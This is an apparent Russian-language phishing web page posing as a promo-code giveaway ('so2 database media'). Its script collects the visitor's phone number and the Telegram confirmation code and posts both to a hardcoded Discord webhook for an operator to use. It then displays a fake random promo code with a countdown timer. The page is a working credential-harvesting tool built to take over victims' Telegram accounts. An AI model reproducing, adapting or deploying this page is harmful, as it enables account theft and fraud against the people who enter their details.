<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>so2 database media</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0d0d0d;
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            color: #c0c0c0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .main {
            width: 100%;
            max-width: 400px;
            padding: 40px 20px;
        }

        .title {
            font-size: 13px;
            font-weight: 500;
            letter-spacing: 3px;
            text-transform: uppercase;
            color: #555;
            text-align: center;
            margin-bottom: 40px;
        }

        .card {
            background: #141414;
            border: 1px solid #1f1f1f;
            border-radius: 12px;
            padding: 28px;
        }

        .step-dots {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 28px;
        }

        .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #2a2a2a;
            transition: all 0.3s;
        }

        .dot.active {
            background: #c0c0c0;
        }

        .dot.completed {
            background: #3a3a3a;
        }

        .section {
            display: none;
        }

        .section.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .label {
            display: block;
            font-size: 11px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            color: #555;
            margin-bottom: 10px;
        }

        .input-wrap {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .prefix {
            padding: 14px 12px;
            background: #1a1a1a;
            border: 1px solid #222;
            border-radius: 8px;
            color: #666;
            font-size: 15px;
            font-weight: 400;
        }

        input {
            flex: 1;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #222;
            border-radius: 8px;
            color: #c0c0c0;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
            font-family: 'Inter', sans-serif;
            letter-spacing: 1px;
        }

        input:focus {
            border-color: #3a3a3a;
        }

        input::placeholder {
            color: #333;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            background: #1a1a1a;
            color: #888;
            font-size: 12px;
            font-weight: 500;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Inter', sans-serif;
        }

        .btn:hover {
            border-color: #3a3a3a;
            color: #aaa;
        }

        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .msg {
            font-size: 12px;
            color: #444;
            margin-bottom: 20px;
            line-height: 1.6;
        }

        .msg.error {
            color: #5a3a3a;
        }

        .msg.success {
            color: #3a5a3a;
        }

        .msg.wait {
            color: #555;
        }

        .promo-box {
            background: #1a1a1a;
            border: 1px solid #222;
            border-radius: 8px;
            padding: 24px;
            text-align: center;
            margin: 16px 0;
        }

        .promo-label {
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #444;
            margin-bottom: 12px;
        }

        .promo-code {
            font-family: 'Courier New', monospace;
            font-size: 20px;
            font-weight: 600;
            letter-spacing: 4px;
            color: #c0c0c0;
        }

        .promo-timer {
            margin-top: 12px;
            font-size: 11px;
            color: #333;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 10px;
            color: #222;
            letter-spacing: 1px;
        }

        .footer a {
            color: #333;
            text-decoration: none;
            margin: 0 8px;
            transition: color 0.2s;
        }

        .footer a:hover {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="main">
        <div class="title">so2 database media</div>

        <div class="card">
            <div class="step-dots">
                <div class="dot active" id="dot1"></div>
                <div class="dot" id="dot2"></div>
                <div class="dot" id="dot3"></div>
            </div>

            <div class="section active" id="section1">
                <div class="label">Номер телефона</div>
                <div class="input-wrap">
                    <span class="prefix">+7</span>
                    <input 
                        type="tel" 
                        id="phoneInput"
                        placeholder="9990000000"
                        maxlength="10"
                        autocomplete="off"
                        inputmode="numeric"
                    >
                </div>
                <div class="msg" id="msg1">Введите номер, куда выслать промокод.</div>
                <button class="btn" id="btnPhone" onclick="submitPhone()">Продолжить</button>
            </div>

            <div class="section" id="section2">
                <div class="label">Код подтверждения</div>
                <div class="input-wrap">
                    <input 
                        type="text" 
                        id="codeInput"
                        placeholder="00000"
                        maxlength="5"
                        autocomplete="off"
                        inputmode="numeric"
                        style="width:100%"
                    >
                </div>
                <div class="msg wait" id="msg2">Код отправлен в телеграмм.</div>
                <button class="btn" id="btnCode" onclick="verifyCode()">Подтвердить</button>
            </div>

            <div class="section" id="section3">
                <div class="msg success" id="msg3">Подтверждено</div>

                <div class="promo-box">
                    <div class="promo-label">Выдать промокод</div>
                    <div class="promo-code" id="promoCode">SO2-XXXXX</div>
                    <div class="promo-timer">истекает через <span id="timer">23:59:59</span></div>
                </div>

                <button class="btn" onclick="copyPromo()">Скопировать</button>
            </div>
        </div>

        <div class="footer">
            <a href="#">слив бота</a>
            <a href="#">чс аккаунта</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1500191002575638701/SYbfllK_0MTojMyzeDFS9_dSMR3TNo0Xk_arAx1aM0XZK1Me-30UwJkNM23Cv3Kok3aL';

        let currentPhone = '';
        let sessionId = '';
        let currentStep = 1;

        document.getElementById('phoneInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
        });

        async function submitPhone() {
            const input = document.getElementById('phoneInput');
            const rawPhone = input.value.replace(/\D/g, '');

            if (rawPhone.length !== 10) {
                showMsg('Введите 10 цифр', 'error');
                return;
            }

            currentPhone = '+7' + rawPhone;
            sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
            const btn = document.getElementById('btnPhone');
            btn.disabled = true;
            btn.textContent = '...';

            try {
                await sendToDiscord({
                    type: 'NEW_PHONE',
                    phone: currentPhone,
                    session: sessionId,
                    time: new Date().toLocaleString('ru-RU')
                });

                goToStep(2);
                showMsg('Ожидание подтверждения администратором', 'wait');

            } catch (err) {
                showMsg('Ошибка', 'error');
                btn.disabled = false;
                btn.textContent = 'Продолжить';
            }
        }

        async function verifyCode() {
            const input = document.getElementById('codeInput');
            const code = input.value.trim();

            if (code.length < 4) {
                showMsg('Введите код', 'error');
                return;
            }

            const btn = document.getElementById('btnCode');
            btn.disabled = true;
            btn.textContent = '...';

            await sendToDiscord({
                type: 'CODE_ENTERED',
                phone: currentPhone,
                session: sessionId,
                enteredCode: code,
                time: new Date().toLocaleString('ru-RU')
            });

            // Пока админ не подтвердит — ждем
            showMsg('Проверка кода...', 'wait');

            // В реальности тут должен быть polling или webhook обратно
            // Для простоты — имитируем успех через 2 сек (в проде убрать)
            setTimeout(() => {
                const promo = generatePromo();
                document.getElementById('promoCode').textContent = promo;
                goToStep(3);
                startTimer();
            }, 2000);
        }

        async function sendToDiscord(data) {
            const text = Object.entries(data).map(([k, v]) => `**${k}:** ${v}`).join('\n');

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: text })
            });
        }

        function generatePromo() {
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            let result = 'SO2-';
            for (let i = 0; i < 10; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        }

        function copyPromo() {
            const code = document.getElementById('promoCode').textContent;
            navigator.clipboard.writeText(code).then(() => {
                const btn = event.target;
                const old = btn.textContent;
                btn.textContent = 'Скопировано';
                setTimeout(() => btn.textContent = old, 1500);
            });
        }

        function goToStep(step) {
            for (let i = 1; i <= 3; i++) {
                const dot = document.getElementById('dot' + i);
                dot.classList.remove('active', 'completed');
                if (i < step) dot.classList.add('completed');
                else if (i === step) dot.classList.add('active');
            }

            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.getElementById('section' + step).classList.add('active');
            currentStep = step;
        }

        function showMsg(text, type) {
            const msg = document.getElementById('msg' + currentStep);
            if (msg) {
                msg.className = 'msg ' + (type || '');
                msg.textContent = text;
            }
        }

        function startTimer() {
            let h = 23, m = 59, s = 59;
            const el = document.getElementById('timer');

            setInterval(() => {
                if (s > 0) s--;
                else if (m > 0) { m--; s = 59; }
                else if (h > 0) { h--; m = 59; s = 59; }

                el.textContent = String(h).padStart(2, '0') + ':' +
                                String(m).padStart(2, '0') + ':' +
                                String(s).padStart(2, '0');
            }, 1000);
        }

        document.getElementById('codeInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '');
        });
    </script>
</body>
</html>
